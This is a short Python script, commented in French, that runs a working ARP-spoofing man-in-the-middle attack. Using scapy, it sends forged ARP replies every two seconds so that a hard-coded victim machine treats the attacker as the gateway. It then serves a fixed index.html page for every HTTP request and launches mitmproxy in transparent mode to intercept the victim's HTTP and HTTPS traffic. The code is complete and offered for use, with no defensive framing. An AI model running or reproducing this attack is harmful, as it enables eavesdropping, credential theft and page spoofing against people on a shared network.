import os
import threading
import time
from scapy.all import ARP, Ether, srp, send
import http.server
import socketserver

# Variables globales
target_ip = "192.168.1.73"  # IP de la machine cible 
spoof_ip = "192.168.1.254"  # IP de la passerelle/routeur

def get_target_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

target_mac = get_target_mac(target_ip)

# 1. ARP Spoofing pour rediriger le trafic vers notre machine
def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def start_arp_spoofing():
    print(f"Started ARP spoofing on target {target_ip} pretending to be {spoof_ip}")
    while True:
        arp_spoof(target_ip, spoof_ip, target_mac)
        time.sleep(2)  # Répéter l'attaque toutes les 2 secondes

# 2. Serveur HTTP local pour servir des fichiers
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f"Received GET request for {self.path}")  # Log de la requête
        # Rediriger toute requête vers index.html
        self.send_response(200)  # Réponse OK
        self.send_header("Content-type", "text/html")  # Type de contenu
        self.end_headers()
        
        # Lire et retourner le contenu de index.html
        with open("index.html", "rb") as f:
            self.wfile.write(f.read())

def start_http_server():
    PORT = 8080  # Utilise le port 8080 pour le serveur HTTP
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print(f"Serving HTTP on port {PORT}")
        httpd.serve_forever()

# Fonction principale pour lancer toutes les étapes
def main():
    # Lancer ARP spoofing dans un thread séparé
    threading.Thread(target=start_arp_spoofing, daemon=True).start()

    # Démarrer le serveur HTTP dans un thread séparé
    http_thread = threading.Thread(target=start_http_server, daemon=True)
    http_thread.start()

    print("Waiting for HTTP requests...")

    # Lancer mitmproxy pour intercepter le trafic HTTP/HTTPS
    os.system("mitmproxy --mode transparent --listen-port 8082")

if __name__ == "__main__":
    main()